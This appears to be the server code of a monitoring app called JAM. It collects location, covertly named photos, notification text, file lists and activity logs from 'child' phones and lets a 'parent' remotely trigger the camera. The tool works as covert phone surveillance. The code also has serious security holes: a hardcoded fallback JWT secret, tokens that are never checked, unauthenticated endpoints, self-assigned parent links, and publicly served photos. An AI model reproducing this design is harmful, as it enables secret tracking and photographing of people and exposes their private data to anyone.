import express from 'express';
import cors from 'cors';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { PrismaClient } from '@prisma/client';
import http from 'http';
import { Server } from 'socket.io';
import multer from 'multer';
import path from 'path';
import fs from 'fs';

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const prisma = new PrismaClient();

app.use(cors());
app.use(express.json());

// Fixed: Using Environment Variable for Secret
const JWT_SECRET = process.env.JWT_SECRET || 'JAM_SUPER_SECRET_KEY_2026';

// Setup Multer Storage for photos
const uploadDir = path.join(__dirname, '../uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, 'jam_hidden_pic_' + uniqueSuffix + path.extname(file.originalname));
  }
});
const upload = multer({ storage: storage });

app.use('/uploads', express.static(uploadDir));

// ------------------------------------------------------------
// 1️⃣ REGISTER API (UPDATED - Role & ParentId Support)
// ------------------------------------------------------------
app.post('/register', async (req, res) => {
  try {
    const { name, email, password, role, parentId } = req.body; // ✅ role & parentId add
    const existingUser = await prisma.user.findUnique({ where: { email } });
    if (existingUser) {
      return res.status(400).json({ success: false, message: 'Email is already registered!' });
    }
    const hashedPassword = await bcrypt.hash(password, 10);
    
    // ✅ Naya data object (role aur parentId support)
    const userData = {
      name,
      email,
      password: hashedPassword,
      role: role || 'child', // Default child
    };
    if (parentId) {
      userData.parentId = parentId;
    }

    await prisma.user.create({ data: userData });
    res.json({ success: true, message: 'Account created successfully!' });
  } catch (error) {
    console.error('Registration Error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ------------------------------------------------------------
// 2️⃣ LOGIN API (UPDATED - Role Return Karega)
// ------------------------------------------------------------
app.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const user = await prisma.user.findUnique({ where: { email } });
    if (!user) {
      return res.status(400).json({ success: false, message: 'Invalid credentials!' });
    }
    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(400).json({ success: false, message: 'Invalid credentials!' });
    }
    const token = jwt.sign({ id: user.id }, JWT_SECRET, { expiresIn: '7d' });
    res.json({
      success: true,
      message: 'Login successful!',
      token,
      user: { 
        id: user.id, 
        name: user.name, 
        email: user.email,
        role: user.role // ✅ Yahan role bhejo
      }
    });
  } catch (error) {
    console.error('Login Error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ------------------------------------------------------------
// 3️⃣ ADD DEVICE API (SAME)
// ------------------------------------------------------------
app.post('/add-device', async (req, res) => {
  try {
    const { userId, deviceName, androidVersion, battery } = req.body;
    const newDevice = await prisma.device.create({
      data: { userId, deviceName, androidVersion, battery, status: 'online' }
    });
    res.json({ success: true, message: 'Device added successfully!', device: newDevice });
  } catch (error) {
    console.error('Add Device Error:', error);
    res.status(500).json({ success: false, message: 'Error adding device' });
  }
});

// ------------------------------------------------------------
// 4️⃣ GET DEVICES API (SAME)
// ------------------------------------------------------------
app.get('/devices/:userId', async (req, res) => {
  try {
    const { userId } = req.params;
    const devices = await prisma.device.findMany({ 
        where: { userId },
        orderBy: { createdAt: 'desc' }
    });
    res.json({ success: true, count: devices.length, devices });
  } catch (error) {
    console.error('Get Devices Error:', error);
    res.status(500).json({ success: false, message: 'Error fetching devices' });
  }
});

// ------------------------------------------------------------
// 5️⃣ UPDATE LOCATION API (SAME)
// ------------------------------------------------------------
app.post('/update-location', async (req, res) => {
  try {
    const { userId, latitude, longitude } = req.body;
    const userDevices = await prisma.device.findMany({
        where: { userId },
        orderBy: { createdAt: 'desc' }
    });

    if (userDevices.length > 0) {
        const latestDeviceId = userDevices[0].id;
        await prisma.device.update({
            where: { id: latestDeviceId },
            data: { latitude, longitude, status: 'online' }
        });
        
        io.emit('device_updated', { userId });
        res.json({ success: true, message: 'Location updated successfully!' });
    } else {
        res.status(404).json({ success: false, message: 'No device found to update' });
    }
  } catch (error) {
    console.error('Update Location Error:', error);
    res.status(500).json({ success: false, message: 'Error updating location' });
  }
});

// ------------------------------------------------------------
// 6️⃣ UPLOAD PHOTO API (SAME)
// ------------------------------------------------------------
app.post('/upload-photo', upload.single('photo'), async (req, res) => {
  try {
    const { userId } = req.body;
    if (!req.file) {
      return res.status(400).json({ success: false, message: 'No photo received by server' });
    }
    const baseUrl = req.protocol + '://' + req.get('host');
    const photoUrl = `${baseUrl}/uploads/${req.file.filename}`;
    
    console.log(`📸 New photo received from user: ${userId}`);
    io.emit('new_photo_received', { userId, photoUrl });
    res.json({ success: true, message: 'Photo securely uploaded!', photoUrl });
  } catch (error) {
    console.error('Upload Photo Error:', error);
    res.status(500).json({ success: false, message: 'Server error during photo upload' });
  }
});

// ------------------------------------------------------------
// 7️⃣ DELETE PHOTO API (SAME)
// ------------------------------------------------------------
app.post('/delete-photo', async (req, res) => {
  try {
    const { userId, photoUrl } = req.body;
    if (!photoUrl) {
      return res.status(400).json({ success: false, message: 'Photo URL is required' });
    }
    const filename = photoUrl.split('/').pop();
    if (!filename) {
      return res.status(400).json({ success: false, message: 'Invalid photo URL' });
    }
    const filePath = path.join(__dirname, '../uploads', filename);
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      console.log(`🗑️ Photo deleted permanently: ${filename}`);
      io.emit('photo_deleted', { userId, photoUrl });
      res.json({ success: true, message: 'Photo deleted successfully!' });
    } else {
      res.status(404).json({ success: false, message: 'Photo not found on server' });
    }
  } catch (error) {
    console.error('Delete Photo Error:', error);
    res.status(500).json({ success: false, message: 'Server error during photo deletion' });
  }
});

// ------------------------------------------------------------
// 8️⃣ SYNC FILES API (SAME)
// ------------------------------------------------------------
app.post('/sync-files', async (req, res) => {
  try {
    const { userId, files } = req.body;
    if (!userId || !files) {
      return res.status(400).json({ success: false, message: 'Invalid file data received' });
    }
    console.log(`📁 Received ${files.length} files from user: ${userId}`);
    io.emit('files_updated', { userId, files });
    res.json({ success: true, message: 'Files synced successfully!' });
  } catch (error) {
    console.error('Sync Files Error:', error);
    res.status(500).json({ success: false, message: 'Server error during file sync' });
  }
});

// ------------------------------------------------------------
// 9️⃣ SYNC NOTIFICATIONS API (SAME)
// ------------------------------------------------------------
app.post('/sync-notifications', async (req, res) => {
  try {
    const { userId, packageName, title, text } = req.body;
    if (!userId) return res.status(400).json({ success: false, message: 'Invalid data' });
    console.log(`🔔 New Notification from ${userId}: [${packageName}] ${title}`);
    io.emit('notification_received', { userId, packageName, title, text });
    res.json({ success: true, message: 'Notification synced!' });
  } catch (error) {
    console.error('Sync Notification Error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ------------------------------------------------------------
// 🔟 SYNC ACTIVITY LOGS API (SAME)
// ------------------------------------------------------------
app.post('/sync-activity-logs', async (req, res) => {
  try {
    const { userId, action, details } = req.body;
    if (!userId || !action) {
      return res.status(400).json({ success: false, message: 'Invalid log data received' });
    }
    const timestamp = new Date().toISOString();
    console.log(`📊 New Activity Log from ${userId}: [${action}] ${details}`);
    io.emit('activity_log_received', { userId, action, details, timestamp });
    res.json({ success: true, message: 'Activity Log synced successfully!' });
  } catch (error) {
    console.error('Sync Activity Log Error:', error);
    res.status(500).json({ success: false, message: 'Server error during log sync' });
  }
});

// ------------------------------------------------------------
// 1️⃣1️⃣ 🆕 GET CHILDREN API (PARENT DASHBOARD KE LIYE)
// ------------------------------------------------------------
app.get('/children/:parentId', async (req, res) => {
  try {
    const { parentId } = req.params;
    const children = await prisma.user.findMany({
      where: { parentId: parentId },
      include: { devices: { orderBy: { createdAt: 'desc' } } } // Latest device bhi saath me
    });
    res.json({ success: true, children });
  } catch (error) {
    console.error('Fetch Children Error:', error);
    res.status(500).json({ success: false, message: 'Error fetching children' });
  }
});

// ------------------------------------------------------------
// SOCKET.IO & SERVER START (SAME)
// ------------------------------------------------------------
// Socket.IO Connection Handler (Remote Commands ke saath)
io.on('connection', (socket: any) => {
  console.log(`🔌 A client connected: ${socket.id}`);

  // 1. Jab bhi koi user (Parent ya Child) login kare, wo apni room join kare
  socket.on('register_user', (userId: string) => {
    socket.join(userId);
    console.log(`✅ User ${userId} joined their private room`);
  });

  // 2. Parent ne Child ki photo capture karne ka command bheja
  socket.on('parent_trigger_capture', async (data: any) => {
    const { parentId, childId } = data;
    console.log(`📸 Parent ${parentId} requesting capture from child ${childId}`);

    // (Optional) Security Check: Verify ki child actually iska child hai ya nahi
    try {
      const child = await prisma.user.findUnique({
        where: { id: childId },
        select: { parentId: true }
      });
      if (child?.parentId !== parentId) {
        socket.emit('command_error', 'Unauthorized: This is not your child.');
        return;
      }

      // Child ki room me command bhejo
      io.to(childId).emit('capture_command', { parentId });
    } catch (error: any) {
      console.error('Error verifying parent-child relation:', error);
    }
  });

  // 3. Child ne photo click kar li aur upload kar di, result parent ko bhejo
  socket.on('child_capture_result', (data: any) => {
    const { childId, parentId, photoUrl } = data;
    console.log(`📸 Child ${childId} sent photo to parent ${parentId}: ${photoUrl}`);
    
    // Parent ki room me result bhejo
    io.to(parentId).emit('capture_result', { childId, photoUrl, success: true });
  });

  socket.on('disconnect', () => {
    console.log(`❌ Client disconnected: ${socket.id}`);
  });
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`🚀 JAM API is running!`);
  console.log(`🛡️ JAM Server is active on port ${PORT}`);
});